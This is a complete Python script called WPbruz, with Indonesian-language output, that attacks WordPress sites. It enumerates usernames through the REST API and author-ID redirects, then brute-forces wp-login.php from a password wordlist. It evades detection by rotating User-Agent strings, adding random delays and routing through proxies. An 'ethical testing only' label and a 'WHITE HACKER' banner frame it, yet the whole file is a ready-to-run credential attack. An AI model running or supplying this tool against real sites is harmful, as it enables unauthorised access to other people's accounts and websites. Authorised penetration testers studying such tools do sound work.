#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import os
import sys
import argparse
import logging
import random
import time
import platform
import subprocess

from pathlib import Path
from typing import List, Optional, Tuple

# ──────────────────────────────────────────────────────────────────────────────
#  Terminal Color Codes
# ──────────────────────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
RED    = "\033[91m"
CYAN   = "\033[96m"
RESET  = "\033[0m"

# ──────────────────────────────────────────────────────────────────────────────
#  ASCII Art Header
# ──────────────────────────────────────────────────────────────────────────────
ASCII_ART = f"""
{GREEN}
 █     █░ ██▓███   ▄▄▄▄    ██▀███   █    ██ ▒███████▒
▓█░ █ ░█░▓██░  ██▒▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▒ ▒ ▒ ▄▀░
▒█░ █ ░█ ▓██░ ██▓▒▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░░ ▒ ▄▀▒░ 
░█░ █ ░█ ▒██▄█▓▒ ▒▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░  ▄▀▒   ░
░░██▒██▓ ▒██▒ ░  ░░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓ ▒███████▒
░ ▓░▒ ▒  ▒▓▒░ ░  ░░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░▒▒ ▓░▒░▒
  ▒ ░ ░  ░▒ ░     ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░ ░░▒ ▒ ░ ▒
  ░   ░  ░░        ░    ░   ░░   ░  ░░░ ░ ░ ░ ░ ░ ░ ░
    ░              ░         ░        ░       ░ ░    
                        ░                   ░        
{RESET}

{CYAN}WHITE HACKER{RESET}
"""

# ──────────────────────────────────────────────────────────────────────────────
#  Some common User-Agent strings to rotate
# ──────────────────────────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
    " Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko)"
    " Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
    " Chrome/115.0.0.0 Safari/537.36",
]

# ──────────────────────────────────────────────────────────────────────────────
def clear_screen():
    """Clear terminal screen, cross-platform."""
    cmd = "cls" if platform.system() == "Windows" else "clear"
    subprocess.call(cmd, shell=True)

# ──────────────────────────────────────────────────────────────────────────────
def setup_logging(log_file: Optional[Path] = None, debug: bool = False):
    """Configure logging to console and optional file."""
    level = logging.DEBUG if debug else logging.INFO
    handlers = [logging.StreamHandler(sys.stdout)]
    if log_file:
        handlers.append(logging.FileHandler(log_file, encoding="utf-8"))
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(message)s",
        handlers=handlers,
    )

# ──────────────────────────────────────────────────────────────────────────────
def get_usernames(target_url: str, timeout: float) -> List[str]:
    """Try WP REST API first, fallback to author enumeration."""
    users: List[str] = []
    api_url = f"{target_url.rstrip('/')}/wp-json/wp/v2/users"
    logging.info("Mencoba REST API: %s", api_url)
    try:
        resp = requests.get(
            api_url,
            timeout=timeout,
            headers={"User-Agent": random.choice(USER_AGENTS)},
        )
        if resp.status_code == 200:
            data = resp.json()
            for u in data:
                slug = u.get("slug")
                if slug:
                    users.append(slug)
            logging.info("Ditemukan %d user lewat REST API", len(users))
            return users
    except requests.RequestException as e:
        logging.debug("REST API gagal: %s", e)
    except ValueError as e:
        logging.warning("Gagal parsing JSON: %s", e)

    logging.info("Fallback author enumeration...")
    for i in range(1, 11):
        url = f"{target_url.rstrip('/')}/?author={i}"
        try:
            resp = requests.get(
                url,
                timeout=timeout,
                allow_redirects=True,
                headers={"User-Agent": random.choice(USER_AGENTS)},
            )
            if resp.status_code == 200:
                m = re.search(r"/author/([^/]+)/?", resp.url)
                if m:
                    slug = m.group(1)
                    if slug not in users:
                        users.append(slug)
        except requests.RequestException:
            continue

    logging.info("Ditemukan %d user lewat enumeration", len(users))
    return users

# ──────────────────────────────────────────────────────────────────────────────
def pilih_username(usernames: List[str]) -> Optional[str]:
    """Interactive select from list."""
    if not usernames:
        print(f"{RED}[❌] Tidak ada username ditemukan.{RESET}")
        return None

    print(f"\n{BLUE}[🔎] Username yang ditemukan:{RESET}")
    for idx, name in enumerate(usernames, start=1):
        print(f"   [{idx}] {GREEN}{name}{RESET}")

    while True:
        try:
            i = int(input(f"{YELLOW}[?] Pilih nomor username: {RESET}"))
            if 1 <= i <= len(usernames):
                return usernames[i - 1]
        except ValueError:
            pass
        print(f"{RED}[!] Pilihan tidak valid, coba lagi.{RESET}")

# ──────────────────────────────────────────────────────────────────────────────
def bruteforce_wp(
    target_url: str,
    username: str,
    passwords: List[str],
    timeout: float,
    delay_range: Tuple[float, float],
    resume_file: Optional[Path],
    proxy: Optional[str]
) -> Optional[str]:
    """Brute-force WordPress login sequentially, with resume checkpoint & progress."""
    login_url = f"{target_url.rstrip('/')}/wp-login.php"
    session = requests.Session()
    proxies = {"http": proxy, "https": proxy} if proxy else None

    total = len(passwords)

    # Resume support (with reset if out of bounds)
    start_idx = 0
    if resume_file and resume_file.exists():
        val = int(resume_file.read_text().strip() or "0")
        if val >= total:
            # checkpoint sudah melebihi jumlah passwords: reset
            resume_file.unlink()
            logging.info("Resume-file melebihi wordlist, reset ke 0")
        else:
            start_idx = val
            logging.info("Melanjutkan dari password ke-%d", start_idx)

    for idx in range(start_idx, total):
        pwd = passwords[idx]
        # progress
        print(f"\r{YELLOW}[{idx+1}/{total}]{RESET} Mencoba password: {pwd}", end="", flush=True)

        time.sleep(random.uniform(delay_range[0], delay_range[1]))

        data = {
            "log": username,
            "pwd": pwd,
            "wp-submit": "Log In",
            "redirect_to": f"{target_url.rstrip('/')}/wp-admin/",
            "testcookie": "1",
        }
        headers = {"User-Agent": random.choice(USER_AGENTS)}

        try:
            resp = session.post(
                login_url,
                data=data,
                timeout=timeout,
                allow_redirects=True,
                headers=headers,
                proxies=proxies,
            )
        except requests.RequestException as e:
            logging.warning(" Request gagal: %s", e)
            continue

        cookies = session.cookies.get_dict()
        if "wordpress_logged_in" in cookies or "/wp-admin/" in resp.url:
            print()  # newline setelah progress
            logging.info(f"{GREEN}🎉 Password ditemukan: {username} / {pwd}{RESET}")
            if resume_file and resume_file.exists():
                resume_file.unlink()
            return pwd

        # simpan checkpoint
        if resume_file:
            resume_file.write_text(str(idx + 1))

    # selesai tanpa hasil: hapus checkpoint agar run berikutnya mulai dari 0
    print()
    if resume_file and resume_file.exists():
        resume_file.unlink()
    logging.error("%s Tidak ada password cocok untuk %s.%s", RED, username, RESET)
    return None

# ──────────────────────────────────────────────────────────────────────────────
def main():
    clear_screen()
    print(ASCII_ART)

    parser = argparse.ArgumentParser(
        description="WPbruz — Brute-force WordPress (ethical testing only)"
    )
    parser.add_argument("target", help="URL target, e.g. https://example.com")
    parser.add_argument("wordlist", help="Path ke file password list")
    parser.add_argument("--username", help="Username WordPress (jika sudah tahu)")
    parser.add_argument(
        "--timeout", type=float, default=10.0, help="Timeout request (detik)"
    )
    parser.add_argument(
        "--delay",
        type=float,
        nargs=2,
        metavar=("MIN","MAX"),
        default=(1.0, 3.0),
        help="Jeda acak antar request (detik)"
    )
    parser.add_argument("--proxy", help="Proxy (socks5://host:port atau http://host:port)")
    parser.add_argument(
        "--resume-file", default=".wpbruz_resume", help="File checkpoint resume"
    )
    parser.add_argument("--log-file", help="Simpan log ke file")
    parser.add_argument("--debug", action="store_true", help="Tampilkan debug output")
    args = parser.parse_args()

    setup_logging(Path(args.log_file) if args.log_file else None, args.debug)

    # Dapatkan username
    if args.username:
        user = args.username
    else:
        logging.info("Mencari username...")
        users = get_usernames(args.target, args.timeout)
        user = pilih_username(users)
        if not user:
            sys.exit(1)

    # Load wordlist
    try:
        with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            pwds = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logging.error("File wordlist tidak ditemukan: %s", args.wordlist)
        sys.exit(1)

    # Mulai brute-force
    logging.info("Mulai brute-force: %s / %d password", user, len(pwds))
    found = bruteforce_wp(
        target_url=args.target,
        username=user,
        passwords=pwds,
        timeout=args.timeout,
        delay_range=(args.delay[0], args.delay[1]),
        resume_file=Path(args.resume_file),
        proxy=args.proxy,
    )

    if found:
        logging.info("Sukses! %s / %s", user, found)
    else:
        logging.warning("Brute-force selesai tanpa hasil.")

if __name__ == "__main__":
    main()
